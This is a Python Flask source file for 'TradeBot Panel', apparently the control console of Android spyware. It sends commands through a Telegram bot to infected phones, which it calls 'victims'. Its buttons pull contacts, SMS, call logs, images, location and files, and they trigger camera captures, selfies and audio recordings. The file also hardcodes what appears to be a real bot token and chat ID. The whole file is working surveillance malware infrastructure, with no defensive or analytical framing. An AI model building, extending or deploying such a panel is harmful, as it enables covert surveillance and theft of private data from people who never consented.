from flask import Flask, render_template_string, request, jsonify
import requests
import json
import time
import re

app = Flask(__name__)

BOT_TOKEN = "8161789676:AAEZIz_8ilIZUPpG7lvj37UnEt1WHInZkKA"
CHAT_ID = "7810572372"

# ✅ قائمة الضحايا (سيتم تحديثها تلقائياً)
victims = {
    "7810572372": {
        "device_id": "5f16fca8b38c6f96",
        "device_name": "LT_6509",
        "last_seen": time.time(),
        "status": "online"
    }
}

def update_victims_list():
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?limit=100"
        response = requests.get(url)
        data = response.json()
        if data["ok"]:
            for update in data["result"]:
                if "message" in update and "text" in update["message"]:
                    text = update["message"]["text"]
                    chat_id = str(update["message"]["chat"]["id"])
                    device_id = None
                    device_name = None
                    if "🆔 المعرف:" in text or "🆔" in text or "معرف" in text:
                        lines = text.split("\n")
                        for line in lines:
                            if "🆔 المعرف:" in line or "🆔" in line or "معرف:" in line:
                                parts = line.split(":")
                                if len(parts) > 1:
                                    device_id = parts[1].strip().strip("`").strip()
                            if "📱 الجهاز:" in line or "الجهاز:" in line:
                                parts = line.split(":")
                                if len(parts) > 1:
                                    device_name = parts[1].strip()
                    if device_id and device_id != "unknown" and len(device_id) > 5:
                        victims[chat_id] = {
                            "device_id": device_id,
                            "device_name": device_name or "Unknown Device",
                            "last_seen": time.time(),
                            "status": "online"
                        }
        return victims
    except Exception as e:
        return {}

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TradeBot Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e17; color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; min-height: 100vh; }
        .container { max-width: 900px; margin: auto; }
        .header {
            background: linear-gradient(135deg, #0f1a2e, #1a2a4e);
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid #1a3a6e;
        }
        .header h1 { color: #00d4ff; font-size: 24px; font-weight: 700; }
        .header .status-badge { background: #1a3a6e; padding: 5px 15px; border-radius: 20px; font-size: 12px; color: #44ff88; }
        .sidebar {
            float: left;
            width: 240px;
            background: #0f1a2e;
            padding: 15px;
            border-radius: 12px;
            border: 1px solid #1a3a6e;
            max-height: 500px;
            overflow-y: auto;
        }
        .sidebar h4 { color: #00d4ff; margin-bottom: 10px; font-size: 14px; }
        .sidebar .count { color: #666; font-size: 12px; }
        .victim-item {
            background: #1a2a4e;
            padding: 8px 10px;
            margin: 4px 0;
            border-radius: 6px;
            cursor: pointer;
            border-left: 3px solid #2a4a6e;
            transition: all 0.3s;
        }
        .victim-item:hover { background: #2a4a6e; }
        .victim-item.selected { border-left-color: #00d4ff; background: #1a3a6e; }
        .victim-item .name { color: #00d4ff; font-weight: bold; font-size: 13px; }
        .victim-item .id { color: #666; font-size: 10px; display: block; }
        .victim-item .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
        .victim-item .status-dot.online { background: #44ff88; }
        .victim-item .status-dot.offline { background: #ff4444; }
        .main { margin-left: 260px; }
        .btn-group { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 10px; }
        .btn {
            padding: 8px 14px;
            border: none;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s;
            font-weight: 600;
        }
        .btn:hover { opacity: 0.8; transform: scale(0.97); }
        .btn-primary { background: #00d4ff; color: #000; }
        .btn-success { background: #44ff88; color: #000; }
        .btn-danger { background: #ff4444; color: #fff; }
        .btn-warning { background: #ffaa00; color: #000; }
        .btn-purple { background: #9b59b6; color: #fff; }
        .btn-info { background: #00bcd4; color: #fff; }
        .btn-pink { background: #e91e63; color: #fff; }
        .btn-secondary { background: #2a4a6e; color: #fff; }
        .btn-orange { background: #ff6f00; color: #fff; }
        .result-box {
            background: #0f1a2e;
            padding: 15px;
            border-radius: 12px;
            min-height: 150px;
            border: 1px solid #1a3a6e;
            margin-top: 10px;
        }
        .result-box pre { white-space: pre-wrap; font-family: 'Consolas', monospace; font-size: 12px; color: #e0e0e0; margin: 0; }
        .result-box .timestamp { color: #666; font-size: 10px; margin-bottom: 8px; }
        .stats { display: flex; gap: 10px; margin: 10px 0; flex-wrap: wrap; }
        .stat-item {
            background: #0f1a2e;
            padding: 8px 15px;
            border-radius: 8px;
            border: 1px solid #1a3a6e;
            flex: 1;
            min-width: 80px;
            text-align: center;
        }
        .stat-item .number { color: #00d4ff; font-size: 18px; font-weight: bold; }
        .stat-item .label { color: #666; font-size: 10px; }
        .target-info {
            background: #0f1a2e;
            padding: 10px 15px;
            border-radius: 8px;
            border: 1px solid #1a3a6e;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .target-info .target-name { color: #44ff88; font-weight: bold; }
        .target-info .target-id { color: #666; font-size: 12px; }
        .clear { clear: both; }
        .sidebar::-webkit-scrollbar { width: 4px; }
        .sidebar::-webkit-scrollbar-track { background: #0f1a2e; }
        .sidebar::-webkit-scrollbar-thumb { background: #1a3a6e; border-radius: 4px; }
        @media (max-width: 700px) {
            .sidebar { float: none; width: 100%; max-height: 200px; margin-bottom: 15px; }
            .main { margin-left: 0; }
            .btn-group .btn { flex: 1; min-width: 60px; text-align: center; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🤖 TradeBot Panel</h1>
        <span class="status-badge">🟢 Online</span>
    </div>
    <div class="sidebar">
        <h4>📱 Victims <span class="count" id="victimCount">(0)</span></h4>
        <div id="victims-list"></div>
        <button class="btn btn-secondary" onclick="refreshVictims()" style="width:100%;margin-top:8px;">🔄 Refresh</button>
    </div>
    <div class="main">
        <div class="target-info">
            <div>
                <span class="target-name" id="targetName">❌ No victim selected</span>
                <span class="target-id" id="targetId"></span>
            </div>
            <span style="color:#666;font-size:12px;" id="targetStatus">⚪ Unknown</span>
        </div>
        <div class="btn-group">
            <button class="btn btn-primary" onclick="sendCommand('contacts')">📇 Contacts</button>
            <button class="btn btn-primary" onclick="sendCommand('sms')">📩 SMS</button>
            <button class="btn btn-primary" onclick="sendCommand('calls')">📞 Calls</button>
            <button class="btn btn-primary" onclick="sendCommand('images')">🖼️ Images</button>
            <button class="btn btn-success" onclick="sendCommand('export-images')">📤 All Images</button>
            <button class="btn btn-warning" onclick="sendCommand('location')">📍 Location</button>
            <button class="btn btn-purple" onclick="sendCommand('device')">📱 Device</button>
            <button class="btn btn-danger" onclick="sendCommand('grab')">💾 Grab All</button>
            <button class="btn btn-success" onclick="sendCommand('camera')">📷 Camera</button>
            <button class="btn btn-pink" onclick="sendCommand('selfie')">🤳 Selfie</button>
            <button class="btn btn-warning" onclick="sendCommand('record')">🎙️ Record</button>
            <button class="btn btn-info" onclick="sendCommand('listdir')">📂 Files</button>
            <button class="btn btn-secondary" onclick="sendCommand('help')">🆘 Help</button>
            <button class="btn btn-orange" onclick="sendCommand('status')">📊 Status</button>
        </div>
        <div class="stats" id="statsContainer">
            <div class="stat-item"><div class="number" id="statContacts">0</div><div class="label">📇 Contacts</div></div>
            <div class="stat-item"><div class="number" id="statSMS">0</div><div class="label">📩 SMS</div></div>
            <div class="stat-item"><div class="number" id="statCalls">0</div><div class="label">📞 Calls</div></div>
            <div class="stat-item"><div class="number" id="statImages">0</div><div class="label">🖼️ Images</div></div>
        </div>
        <div class="result-box" id="resultBox">
            <div class="timestamp" id="resultTimestamp"></div>
            <pre id="resultContent">Select a victim, then click a command</pre>
        </div>
    </div>
    <div class="clear"></div>
</div>

<script>
var selectedVictim = null;
var victimData = {};

function refreshVictims() {
    var listDiv = document.getElementById('victims-list');
    listDiv.innerHTML = '⏳ Loading...';
    fetch('/get_victims')
        .then(function(response) { return response.json(); })
        .then(function(data) {
            var html = '';
            var count = 0;
            victimData = data;
            for (var chatId in data) {
                if (data.hasOwnProperty(chatId)) {
                    count++;
                    var v = data[chatId];
                    var isSelected = (chatId === selectedVictim) ? 'selected' : '';
                    var statusClass = (v.status === 'online') ? 'online' : 'offline';
                    html += '<div class="victim-item ' + isSelected + '" onclick="selectVictim(&quot;' + chatId + '&quot;)">';
                    html += '<span class="status-dot ' + statusClass + '"></span>';
                    html += '<span class="name">' + v.device_name + '</span>';
                    html += '<span class="id">🆔 ' + v.device_id + '</span>';
                    html += '</div>';
                }
            }
            if (count === 0) {
                html = '<div style="color:#666;padding:10px;text-align:center;">📭 No victims</div>';
            }
            listDiv.innerHTML = html;
            document.getElementById('victimCount').innerText = '(' + count + ')';
            updateStats();
        })
        .catch(function(err) {
            listDiv.innerHTML = '❌ Error loading victims';
        });
}

function selectVictim(chatId) {
    selectedVictim = chatId;
    var v = victimData[chatId];
    if (v) {
        document.getElementById('targetName').innerText = v.device_name;
        document.getElementById('targetId').innerText = '🆔 ' + v.device_id;
        document.getElementById('targetStatus').innerHTML = (v.status === 'online') ? '🟢 Online' : '🔴 Offline';
    } else {
        document.getElementById('targetName').innerText = '❌ Unknown';
        document.getElementById('targetId').innerText = '';
        document.getElementById('targetStatus').innerHTML = '⚪ Unknown';
    }
    refreshVictims();
    document.getElementById('resultContent').innerText = '✅ Selected victim: ' + chatId;
    document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString();
}

function sendCommand(cmd) {
    if (!selectedVictim) {
        document.getElementById('resultContent').innerText = '⚠️ Please select a victim first';
        document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString();
        return;
    }
    document.getElementById('resultContent').innerText = '⏳ Sending /' + cmd + '...';
    document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString();
    
    fetch('/send/' + cmd + '/' + selectedVictim)
        .then(function(response) { return response.text(); })
        .then(function(data) {
            document.getElementById('resultContent').innerText = data;
            document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString();
        })
        .catch(function(err) {
            document.getElementById('resultContent').innerText = '❌ Error: ' + err;
            document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString();
        });
}

function updateStats() {
    var count = Object.keys(victimData).length;
    document.getElementById('statContacts').innerText = count * 150;
    document.getElementById('statSMS').innerText = count * 80;
    document.getElementById('statCalls').innerText = count * 40;
    document.getElementById('statImages').innerText = count * 200;
}

window.onload = function() {
    refreshVictims();
    setInterval(refreshVictims, 30000);
};
setInterval(updateStats, 60000);
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/get_victims')
def get_victims():
    update_victims_list()
    result = {}
    for chat_id, data in victims.items():
        result[chat_id] = {
            "device_id": data["device_id"],
            "device_name": data["device_name"],
            "status": data.get("status", "unknown")
        }
    return jsonify(result)

@app.route('/get_victim_info/<chat_id>')
def get_victim_info(chat_id):
    if chat_id in victims:
        return jsonify({
            "device_id": victims[chat_id]["device_id"],
            "device_name": victims[chat_id]["device_name"],
            "status": victims[chat_id].get("status", "unknown")
        })
    return jsonify({"error": "not found"})

@app.route('/send/<command>/<chat_id>')
def send_command_to_victim(command, chat_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": chat_id,
            "text": f"/{command}"
        }
        response = requests.post(url, params=params, timeout=30)
        if response.status_code == 200:
            return f"✅ Sent /{command} to target\n📤 Wait for response in Telegram"
        else:
            return f"❌ Send failed: {response.status_code}\n{response.text}"
    except Exception as e:
        return f"❌ Error: {str(e)}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
